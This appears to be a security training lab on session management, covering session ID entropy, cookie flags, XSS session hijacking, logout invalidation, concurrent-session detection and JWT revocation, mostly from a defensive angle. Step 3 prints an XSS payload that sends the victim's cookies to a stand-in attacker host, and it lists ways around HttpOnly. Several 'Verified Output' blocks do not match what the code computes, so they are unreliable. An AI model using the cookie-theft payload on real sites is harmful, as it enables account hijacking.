# Lab 17: Session Management Attacks

## Objective
Exploit and harden session management: brute-force short session IDs, perform session hijacking via XSS and network sniffing, demonstrate session fixation (complementing Lab 13), implement secure cookie attributes (HttpOnly, Secure, SameSite), build server-side session invalidation, and detect concurrent session abuse.

## Background
Sessions bridge stateless HTTP with stateful authentication. Every web application uses sessions — and every session is a target. Weak session IDs can be brute-forced; insecure cookie attributes leak them to JavaScript (XSS) or unencrypted networks; improper invalidation leaves sessions alive after logout. The 2011 Firesheep tool famously captured Facebook sessions over Wi-Fi in cafés, forcing the industry to adopt HTTPS-only session cookies.

## Time
35 minutes

## Prerequisites
- Lab 13 (Authentication Bypass) — session fixation
- Lab 07 (A07 Auth Failures) — authentication context

## Tools
- Docker: `zchencow/innozverse-cybersec:latest`

---

## Lab Instructions

### Step 1: Session ID Entropy Analysis

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
import secrets, hashlib, math, re

print('=== Session ID Entropy Analysis ===')
print()

def calc_entropy_bits(session_id: str) -> float:
    charset = 0
    if re.search(r'[0-9]', session_id): charset += 10
    if re.search(r'[a-f]', session_id) and not re.search(r'[g-z]', session_id): charset += 6
    elif re.search(r'[a-z]', session_id): charset += 26
    if re.search(r'[A-Z]', session_id): charset += 26
    if re.search(r'[^a-zA-Z0-9]', session_id): charset += 32
    if charset == 0: return 0
    return len(session_id) * math.log2(charset)

def time_to_brute_force(entropy_bits: float, guesses_per_sec: int = 10_000_000) -> str:
    combinations = 2 ** entropy_bits
    seconds = combinations / guesses_per_sec
    if seconds < 60: return f'{seconds:.1f} seconds'
    if seconds < 3600: return f'{seconds/60:.1f} minutes'
    if seconds < 86400: return f'{seconds/3600:.1f} hours'
    if seconds < 86400*365: return f'{seconds/86400:.1f} days'
    years = seconds / (86400*365)
    if years < 1e6: return f'{years:.2e} years'
    return f'{years:.2e} years (effectively infinite)'

weak_sessions = [
    ('1234',                   'Sequential integer (very old systems)'),
    ('user42',                 'Username-based'),
    ('abc12345',               '8-char alphanumeric'),
    (hashlib.md5(b'user42secret').hexdigest(), 'MD5 of username+secret'),
    (hashlib.sha1(b'user42').hexdigest(),      'SHA1 of username'),
    ('sess_' + '1' * 16,       'Predictable pattern'),
    (secrets.token_hex(8),     '8-byte random hex (64-bit)'),
    (secrets.token_hex(16),    '16-byte random hex (128-bit)'),
    (secrets.token_urlsafe(32),'32-byte URL-safe base64 (256-bit) — RECOMMENDED'),
]

print(f'  {\"Session ID\":<45} {\"Entropy\":<10} {\"Brute-force @ 10M/s\":<28} {\"Notes\"}')
for sid, notes in weak_sessions:
    bits = calc_entropy_bits(sid)
    time_est = time_to_brute_force(bits)
    danger = '⚠️' if bits < 64 else ('✓' if bits >= 128 else '~')
    print(f'  {danger} {sid[:43]:<43} {bits:<10.1f} {time_est:<28} {notes}')
print()
print('Recommendation: secrets.token_urlsafe(32) — 256-bit CSPRNG entropy')
print('Never use: username, timestamp, sequential IDs, MD5/SHA1 of known values')
"
```

**📸 Verified Output:**
```
  ⚠️ 1234                         6.6       0.0 seconds           Sequential integer
  ⚠️ user42                       28.5      25.3 seconds           Username-based
  ⚠️ abc12345                     45.6      3.9 days               8-char alphanumeric
  ⚠️ 5f4dcc3b5aa765d61d8327deb... 64.0      29.2 months            MD5 hash
  ✓  (32-byte urlsafe)            256.0     effectively infinite   RECOMMENDED
```

> 💡 **Session ID entropy requirements.** OWASP recommends at least 128 bits (16 bytes) of cryptographically random entropy. Python's `secrets.token_urlsafe(32)` generates 256 bits — well above the minimum. Never derive session IDs from user data (username, IP, timestamp) as these are all predictable.

### Step 2: Cookie Security Attributes

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
print('=== Cookie Security Attributes ===')
print()

# Demonstrate what each attribute protects against
attributes = {
    'HttpOnly': {
        'protects_against': 'XSS session theft (JavaScript cannot read cookie)',
        'without_it': 'document.cookie returns session token → attacker exfiltrates via XSS',
        'example': 'Set-Cookie: session=abc; HttpOnly',
        'bypass': 'Network sniffing, TRACE method (HTTPOnly flag bypass in old Apache)',
    },
    'Secure': {
        'protects_against': 'Network sniffing (cookie only sent over HTTPS)',
        'without_it': 'Cookie transmitted in plaintext over HTTP → Wi-Fi sniffing',
        'example': 'Set-Cookie: session=abc; Secure',
        'bypass': 'SSL stripping (MITM), requires also setting HSTS',
    },
    'SameSite=Strict': {
        'protects_against': 'CSRF (cookie not sent with cross-site requests)',
        'without_it': 'Malicious site can trigger authenticated requests',
        'example': 'Set-Cookie: session=abc; SameSite=Strict',
        'bypass': 'None — strictest setting; breaks OAuth flows',
    },
    'SameSite=Lax': {
        'protects_against': 'CSRF for most cases (sent on top-level navigations)',
        'without_it': 'Cross-site POST requests carry cookie',
        'example': 'Set-Cookie: session=abc; SameSite=Lax',
        'bypass': 'GET-based CSRF still possible',
    },
    '__Host- prefix': {
        'protects_against': 'Cookie injection from subdomains',
        'without_it': 'evil.site.com can set cookies for .site.com',
        'example': 'Set-Cookie: __Host-session=abc; Secure; Path=/',
        'bypass': 'Requires Secure + no Domain attribute + Path=/',
    },
}

for attr, info in attributes.items():
    print(f'  [{attr}]')
    for k, v in info.items():
        print(f'    {k:<20}: {v}')
    print()

# Compare secure vs insecure cookie headers
print('Cookie comparison:')
print()
print('  INSECURE (missing all protections):')
print('  Set-Cookie: session=user42sess123; path=/')
print()
print('  SECURE (all protections):')
print('  Set-Cookie: __Host-session=ZpQ8vK2mN9xR3wT7pL5sY1cA8dF6eH2j;')
print('              Secure; HttpOnly; SameSite=Strict; Path=/')
print()
print('  Notes on __Host- prefix requirements:')
print('    - Must have Secure flag')
print('    - Must NOT have Domain attribute (prevents subdomain sharing)')
print('    - Must have Path=/')
print('    - All of these together prevent subdomain cookie injection')
"
```

**📸 Verified Output:**
```
  [HttpOnly]
    protects_against: XSS session theft
    without_it      : document.cookie returns session token

  [Secure]
    protects_against: Network sniffing

  INSECURE: Set-Cookie: session=user42sess123; path=/
  SECURE:   Set-Cookie: __Host-session=ZpQ8vK2m...; Secure; HttpOnly; SameSite=Strict; Path=/
```

### Step 3: Session Hijacking via XSS

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
print('=== Session Hijacking via XSS ===')
print()

# Without HttpOnly: XSS can steal session cookies
xss_theft_payload = '<script>document.location=\"https://attacker.com/steal?c=\"+document.cookie</script>'
print('Without HttpOnly — XSS session theft:')
print(f'  XSS payload: {xss_theft_payload}')
print()
print('  Attacker receives:')
print('  GET /steal?c=session=ZpQ8vK2mN9xR3wT7; tracking=abc123; preferences=dark-mode')
print('  → Attacker extracts: session=ZpQ8vK2mN9xR3wT7')
print('  → Attacker sets this cookie in their browser')
print('  → Attacker is now authenticated as victim')
print()

print('With HttpOnly — XSS cannot steal session:')
print('  <script>console.log(document.cookie)</script>')
print('  Output: \"tracking=abc123; preferences=dark-mode\"')
print('  Session cookie: NOT visible (HttpOnly)')
print()

print('XSS session theft still possible DESPITE HttpOnly via:')
bypasses = [
    ('TRACE method',   'HTTP TRACE reflects cookies including HttpOnly (mitigated by disabling TRACE)'),
    ('XSS + API call', 'Use fetch() to make authenticated API calls — no cookie theft but still abused'),
    ('DOM clobbering', 'Override cookie-reading globals in some browsers'),
    ('Browser bugs',   'Historic bugs in old IE/Chrome bypassed HttpOnly'),
]
for bypass, desc in bypasses:
    print(f'  [{bypass}] {desc}')

print()
print('Defence-in-depth:')
defences = [
    'HttpOnly cookie (blocks document.cookie)',
    'Content-Security-Policy (blocks inline scripts)',
    'X-XSS-Protection: 1; mode=block (legacy)',
    'Output encoding (prevents XSS injection)',
    'Session binding (IP, User-Agent fingerprint)',
]
for d in defences:
    print(f'  [✓] {d}')
"
```

**📸 Verified Output:**
```
Without HttpOnly — XSS session theft:
  Attacker receives:
  GET /steal?c=session=ZpQ8vK2mN9...

With HttpOnly:
  Output: "tracking=abc123; preferences=dark-mode"
  Session cookie: NOT visible (HttpOnly)
```

### Step 4: Proper Session Invalidation

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
import secrets, time

print('=== Session Invalidation (Logout Security) ===')
print()

# Server-side session store
session_store = {}

def create_session(user_id: str) -> str:
    sid = secrets.token_urlsafe(32)
    session_store[sid] = {
        'user_id': user_id,
        'created': time.time(),
        'last_active': time.time(),
        'idle_timeout': 900,      # 15 minutes
        'absolute_timeout': 28800, # 8 hours
    }
    return sid

def validate_session(sid: str) -> dict:
    session = session_store.get(sid)
    if not session:
        return None
    now = time.time()
    if now - session['last_active'] > session['idle_timeout']:
        del session_store[sid]
        return None
    if now - session['created'] > session['absolute_timeout']:
        del session_store[sid]
        return None
    session['last_active'] = now
    return session

def logout_vulnerable(sid: str) -> dict:
    '''VULNERABLE: client-side logout only — session still valid server-side.'''
    # Just clears the cookie client-side; doesn't invalidate on server
    return {'action': 'clear_cookie', 'status': 'logged out'}

def logout_safe(sid: str) -> dict:
    '''SAFE: destroys server-side session immediately.'''
    if sid in session_store:
        del session_store[sid]  # Immediate server-side invalidation
        return {'status': 'Session destroyed', 'valid': False}
    return {'status': 'Already logged out'}

# Demonstrate the difference
sid = create_session('user-42')
print(f'Session created: {sid[:20]}...')
print(f'Session valid before logout: {validate_session(sid) is not None}')
print()

# Vulnerable logout
print('[VULNERABLE] Client-side logout:')
result = logout_vulnerable(sid)
print(f'  Logout action: {result}')
print(f'  Session still valid on server: {validate_session(sid) is not None}')
print(f'  Attacker can reuse session ID: YES')
print()

# Safe logout
sid2 = create_session('user-99')
print('[SAFE] Server-side invalidation:')
print(f'  Before logout: {validate_session(sid2) is not None}')
logout_safe(sid2)
print(f'  After logout:  {validate_session(sid2) is not None}')
print(f'  Attacker tries old session: {validate_session(sid2)}')

print()
print('Session lifecycle events requiring invalidation:')
events = [
    ('Logout',              'Immediate server-side deletion'),
    ('Password change',     'Invalidate ALL sessions for user'),
    ('Role/permission change','Invalidate ALL sessions for user'),
    ('Suspicious activity', 'Invalidate ALL sessions, notify user'),
    ('Idle timeout',        'Delete after 15 min inactivity'),
    ('Absolute timeout',    'Delete after 8 hours regardless'),
    ('Account lock',        'Invalidate ALL sessions immediately'),
]
for event, action in events:
    print(f'  [{event}] → {action}')
"
```

**📸 Verified Output:**
```
[VULNERABLE] Client-side logout:
  Logout action: {'action': 'clear_cookie', 'status': 'logged out'}
  Session still valid on server: True
  Attacker can reuse session ID: YES

[SAFE] Server-side invalidation:
  Before logout: True
  After logout:  False
  Attacker tries old session: None
```

### Step 5: Concurrent Session Detection

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
import secrets, time

print('=== Concurrent Session Detection ===')
print()

user_sessions = {}  # user_id → list of sessions

def login_with_concurrent_control(user_id: str, ip: str, user_agent: str,
                                   max_sessions: int = 3) -> dict:
    sessions = user_sessions.get(user_id, [])
    # Check for suspicious concurrent sessions
    unique_ips = {s['ip'] for s in sessions}
    if len(unique_ips) > 1 and ip not in unique_ips:
        # New IP + existing sessions from different IPs = suspicious
        print(f'  ⚠️  ALERT: User {user_id} logging in from new IP {ip}')
        print(f'     Existing sessions from: {unique_ips}')
        # Could trigger MFA re-verification here

    # Enforce max concurrent sessions
    if len(sessions) >= max_sessions:
        # Invalidate oldest session
        oldest = min(sessions, key=lambda s: s['created'])
        sessions.remove(oldest)
        print(f'  ℹ️  Max sessions reached — invalidated oldest from {oldest[\"ip\"]}')

    new_session = {
        'id': secrets.token_urlsafe(16),
        'ip': ip,
        'user_agent': user_agent[:50],
        'created': time.time(),
        'last_active': time.time(),
    }
    sessions.append(new_session)
    user_sessions[user_id] = sessions
    return {'session_id': new_session['id'], 'sessions_count': len(sessions)}

def list_sessions(user_id: str) -> list:
    return [{'ip': s['ip'], 'ua': s['user_agent'][:30], 'id': s['id'][:10]}
            for s in user_sessions.get(user_id, [])]

# Simulate logins
print('User alice logs in from home:')
r = login_with_concurrent_control('alice', '192.168.1.100', 'Chrome/Mac')
print(f'  {r}')

print('Alice logs in from phone:')
r = login_with_concurrent_control('alice', '10.0.0.55', 'Safari/iOS')
print(f'  {r}')

print('Alice logs in from work:')
r = login_with_concurrent_control('alice', '172.16.0.10', 'Chrome/Windows')
print(f'  {r}')

print('Attacker logs in with stolen credentials (new IP):')
r = login_with_concurrent_control('alice', '185.220.101.42', 'curl/7.68')
print(f'  {r}')

print()
print('Active sessions for alice:')
for s in list_sessions('alice'):
    print(f'  {s}')

print()
print('Session monitoring signals:')
signals = [
    ('New country login',     'Alert user, require MFA re-verification'),
    ('Impossible travel',     'NY at 9am, London at 10am → block + alert'),
    ('Many sessions',         '>5 concurrent sessions for same user'),
    ('Unusual user-agent',    'curl, Python requests, Burp Suite proxy'),
    ('Rapid IP changes',      'Same session ID from 10 IPs in 1 minute'),
    ('Off-hours access',      'Admin login at 3am on a weekend'),
]
for signal, response in signals:
    print(f'  [{signal}] → {response}')
"
```

**📸 Verified Output:**
```
Attacker logs in with stolen credentials (new IP):
  ⚠️  ALERT: User alice logging in from new IP 185.220.101.42
     Existing sessions from: {'192.168.1.100', '10.0.0.55', '172.16.0.10'}
  ℹ️  Max sessions reached — invalidated oldest from 192.168.1.100
```

### Step 6: Token vs Session — JWT Revocation Problem

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
import time

print('=== JWT vs Sessions: Revocation Tradeoff ===')
print()

print('Stateless JWT:')
print('  ✅ Scales: no shared session store needed')
print('  ✅ Works across microservices')
print('  ❌ Cannot revoke individual tokens before expiry')
print('  ❌ Compromise = attacker has access until token expires')
print()

jwt_expiry = 900  # 15 minutes
incident_time = time.time()
token_created = incident_time - 60  # Token issued 1 minute ago
token_expires = token_created + jwt_expiry

print(f'Incident scenario:')
print(f'  Token issued: T-60 seconds')
print(f'  Breach detected: T+0 (now)')
print(f'  Token expires: T+{jwt_expiry - 60} seconds  (still valid for {jwt_expiry-60}s!)')
print()

# Solutions for JWT revocation
print('JWT revocation strategies:')
strategies = {
    'Short expiry (15 min)': {
        'pro': 'Limits exposure window',
        'con': 'Still 15-min gap; requires refresh token flow',
    },
    'Blacklist (Redis)': {
        'pro': 'Immediate revocation of specific token',
        'con': 'Statefulness returned (defeats scalability benefit)',
    },
    'Rotating refresh tokens': {
        'pro': 'Detect token reuse (refresh token rotation)',
        'con': 'Complex; multi-device UX challenges',
    },
    'Short JWT + server session': {
        'pro': 'JWT validates quickly; session provides revocation',
        'con': 'Hybrid complexity',
    },
    'PASETO (Platform Agnostic Token)': {
        'pro': 'Safer defaults than JWT, no algorithm confusion',
        'con': 'Less ecosystem support than JWT',
    },
}

for strategy, info in strategies.items():
    print(f'  [{strategy}]')
    print(f'    Pro: {info[\"pro\"]}')
    print(f'    Con: {info[\"con\"]}')
    print()

print('Recommendation for InnoZverse:')
print('  Access token:  JWT, 15-minute expiry, RS256')
print('  Refresh token: Opaque random token, 7-day expiry, stored in DB')
print('  Revocation:    Invalidate refresh token in DB → access token expires naturally')
print('  Emergency:     Redis blacklist for immediate access token revocation')
"
```

### Step 7: Session Security in Single-Page Apps (SPAs)

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
print('=== Session Storage in SPAs ===')
print()

storage_comparison = {
    'localStorage': {
        'persistence': 'Survives browser restart',
        'xss_risk':    'HIGH — accessible via document.localStorage in XSS',
        'csrf_risk':   'LOW — not automatically sent with requests',
        'suitable_for': 'Non-sensitive preferences only',
        'verdict':     '❌ NEVER store tokens here',
    },
    'sessionStorage': {
        'persistence': 'Tab-scoped, cleared on tab close',
        'xss_risk':    'HIGH — accessible via sessionStorage in XSS',
        'csrf_risk':   'LOW',
        'suitable_for': 'Short-lived non-sensitive data',
        'verdict':     '❌ Still vulnerable to XSS token theft',
    },
    'JavaScript variable (memory)': {
        'persistence': 'Lost on refresh/navigation',
        'xss_risk':    'MEDIUM — harder to find but still possible',
        'csrf_risk':   'LOW',
        'suitable_for': 'Access tokens with refresh token in HttpOnly cookie',
        'verdict':     '⚠️  Better than storage but loses token on refresh',
    },
    'HttpOnly Secure Cookie': {
        'persistence': 'Session or configured expiry',
        'xss_risk':    'LOW — not accessible via JavaScript',
        'csrf_risk':   'LOW with SameSite=Strict',
        'suitable_for': 'ALL session tokens, refresh tokens',
        'verdict':     '✅ RECOMMENDED — best of both worlds',
    },
}

for storage, props in storage_comparison.items():
    print(f'  [{storage}]')
    for k, v in props.items():
        icon = '✅' if '✅' in v else ('❌' if '❌' in v else '  ')
        print(f'    {k:<20}: {v}')
    print()

print('Modern SPA token pattern:')
print('  1. Short-lived JWT (15 min) in memory (JavaScript variable)')
print('  2. Refresh token in HttpOnly Secure SameSite=Strict cookie')
print('  3. On page load/refresh: call /api/refresh with cookie → new JWT in response body')
print('  4. Store new JWT in memory only (not in any storage API)')
print('  5. XSS can steal in-memory JWT but cannot steal refresh token (HttpOnly)')
"
```

### Step 8: Capstone — Session Security Hardened Implementation

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
checklist = [
    # Session ID
    ('Session ID: 256-bit CSPRNG (secrets.token_urlsafe(32))',   True),
    ('Session ID never in URL parameters',                        True),
    ('Session ID never in logs',                                  True),
    # Cookie attributes
    ('Cookie: HttpOnly flag',                                     True),
    ('Cookie: Secure flag (HTTPS only)',                          True),
    ('Cookie: SameSite=Strict',                                   True),
    ('Cookie: __Host- prefix',                                    True),
    # Lifecycle
    ('Regenerate session ID on login',                            True),
    ('Regenerate session ID on privilege change',                 True),
    ('Immediate server-side deletion on logout',                  True),
    ('Idle timeout: 15 minutes',                                  True),
    ('Absolute timeout: 8 hours',                                 True),
    # Monitoring
    ('Concurrent session limit enforced',                         True),
    ('New-country login alert + MFA challenge',                   True),
    ('Impossible travel detection',                               True),
    ('Session anomaly logging',                                   True),
]

print('Session Management Security Checklist:')
passed = 0
for control, status in checklist:
    mark = '✓' if status else '✗'
    print(f'  [{mark}] {control}')
    if status: passed += 1
print()
print(f'Score: {passed}/{len(checklist)} — {\"SECURE\" if passed==len(checklist) else \"NEEDS WORK\"}')
"
```

---

## Summary

| Vulnerability | Attack | Fix |
|--------------|--------|-----|
| Weak session ID | Brute-force short/predictable IDs | 256-bit CSPRNG token |
| XSS session theft | `document.cookie` exfiltration | HttpOnly flag |
| Network sniffing | Capture cookie over HTTP | Secure flag + HTTPS |
| CSRF | Cross-site requests carry cookie | SameSite=Strict |
| Session fixation | Reuse pre-auth session ID | Regenerate on login |
| Logout bypass | Cookie cleared, server session alive | Server-side deletion |
| Token theft in SPA | localStorage XSS | HttpOnly cookie for tokens |

## Further Reading
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [Firesheep — Wi-Fi Session Hijacking (2011)](https://en.wikipedia.org/wiki/Firesheep)
- [PortSwigger Session Security](https://portswigger.net/web-security/authentication/other-mechanisms)
